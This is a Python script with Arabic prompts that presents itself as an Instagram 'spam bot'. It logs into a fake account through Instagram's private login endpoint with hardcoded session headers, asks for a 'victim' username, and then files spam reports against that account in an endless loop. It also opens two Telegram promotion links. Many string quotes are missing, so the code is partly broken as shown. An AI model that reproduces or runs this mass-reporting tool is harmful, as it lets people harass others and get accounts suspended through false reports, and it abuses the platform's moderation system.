import time
import sys as n
import time as mm
import uuid
import webbrowser
import requests
import secrets
def slow(M):
 for c in M +  \n :
  n.stdout.write(c)
  n.stdout.flush()
  mm.sleep(1. / 200)

####################dev abs#####################
webbrowser.open( https://t.me/T3bsBoT )
webbrowser.open( https://t.me/OoOoO2oO )
slow("DevAbs")
slow("اهلا بك في بوت سبام فقط انستا ")
uuid = uuid.uuid4()
r = requests.session()
cookies =secrets.token_hex()
print( ======================================== )
filza445=input("يوزر الوهمي-->: ")
FLOZ20=input("الباسورد-->: ")
print( ======================================== )


def filza507():
 url =  https://www.instagram.com/accounts/login/ajax/ 

 headers = {
          accept :  */* ,
          accept-encoding :  gzip, deflate, br ,
          accept-language :  ar,en-US;q=0.9,en;q=0.8 ,
          content-length :  347 ,
          content-type :  application/x-www-form-urlencoded ,
          cookie :  ig_did=D37E2F4F-6193-4E76-B7C6-6FDBE4A0C230; mid=X_3LtAALAAFAdQMURlFUf_U68Q6H; ig_nrcb=1; rur=NAO; csrftoken=JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS; urlgen="{\"2001:16a2:1401:2100:b402:7729:50e7:7155\": 25019}:1l4wLZ:yUcOwB_XJIiXVKxEm2m4SEvH4ds" ,
          origin :  https://www.instagram.com ,
          referer :  https://www.instagram.com/accounts/login/ ,
          sec-ch-ua :  "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99" ,
          sec-ch-ua-mobile :  ?0 ,
          sec-fetch-dest :  empty ,
          sec-fetch-mode :  cors ,
          sec-fetch-site :  same-origin ,
          user-agent :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 ,
          x-csrftoken :  JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS ,
          x-ig-app-id :  936619743392459 ,
          x-ig-www-claim :  hmac.AR1Y1dEsDcV-xq-u_7U0XISuyjCpWSS-VvmOhVU2N6rp95IZ ,
          x-instagram-ajax :  5f4886947dbe ,
          x-requested-with :  XMLHttpRequest 
         }

 data = {
          username : f {filza445} ,
          enc_password : f #PWD_INSTAGRAM_BROWSER:0:&:{FLOZ20} ,
          queryParams :  {} ,
          optIntoOneTap :  false 
         }

 filza5448 = r.post(url, headers=headers, data=data)

 if  "authenticated":true  in filza5448.text:
  print( تم اضافه الوهمي بنجاح  .. )
  r.headers.update({ x-csrftoken : filza5448.cookies[ csrftoken ]})

  print( ==================================== )

  floz70 = input("يوزر الضحيه -->: ")
  sl = int(input("SLEEP انصحك 3-5-->: "))
  print( ==================================== )

  url_id =  https://www.instagram.com/{}/?__a=1 .format(floz70)

  req_id = r.get(url_id).json()
  user_id = str(req_id[ logging_page_id ])
  ffilza2000 =user_id.split( _ )[1]
  done=0

  while True:
   url_spam =  https://www.instagram.com/users/{}/report/ .format(ffilza2000)
   data_spam = {
            source_name :  ,
            reason_id : 1,
            frx_context :  }

   solo = r.post(url_spam, data=data_spam)
   print(f done spam{done} )
   time.sleep(sl)
   done+=1
 else:print( الباسورد او اليوزر غلط )
filza507()

